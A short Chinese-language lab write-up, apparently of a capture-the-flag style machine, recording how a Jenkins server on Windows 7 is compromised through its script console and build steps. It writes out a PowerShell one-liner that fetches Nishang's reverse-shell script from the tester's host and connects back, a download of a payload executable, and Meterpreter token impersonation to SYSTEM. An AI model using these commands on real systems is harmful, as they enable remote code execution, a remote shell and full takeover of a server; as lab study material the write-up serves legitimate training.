入侵

网站是一个项目管理界面，功能比较复杂，探索了好一会

这是一个x86的 win7 系统

日志里疑似网站目录 C:\Program Files (x86)\Jenkins\war

经过我的探索，我发现在 computer/(master)/script 处存在一个java控制台；命令格式为println "uname -a".execute().text

先确定一些基础信息，主机名为alfred，使用的用户名为bruce。
systeminfo：

ifconfig：

问题是可执行的命令非常有限

网站使用的 ci 是 Jenkins ，在网上查一查发现可以命令执行，步骤如下：

  1. 创建一个新项目

  2. build 选择需要的命令格式

  3. 输入命令点保存

  4. 点击 build now

或者点击 configure 也行

  1. 查看输出


既然能执行命令，这里使用 nishang 的 PowerShellTcp.ps1 脚本来反弹shell

Nishang 是一个脚本和有效载荷的框架和集合，它支持使用 PowerShell 进行攻击性安全、渗透测试和红队。

powershell IEX (New-Object Net.WebClient).DownloadString('http://10.11.84.153:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.84.153 -port 1234

成功反弹shell

当然也可以直接用 msf 

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.84.153:8888/ma.exe','ma.exe')"

权限提升

whoami /priv，用户具有 SeImpersonatePrivilege 权限，直接伪造token即可

load incognito
list_tokens -u 
impersonate_token "NT AUTHORITY\SYSTEM" 
migrate -N services.exe
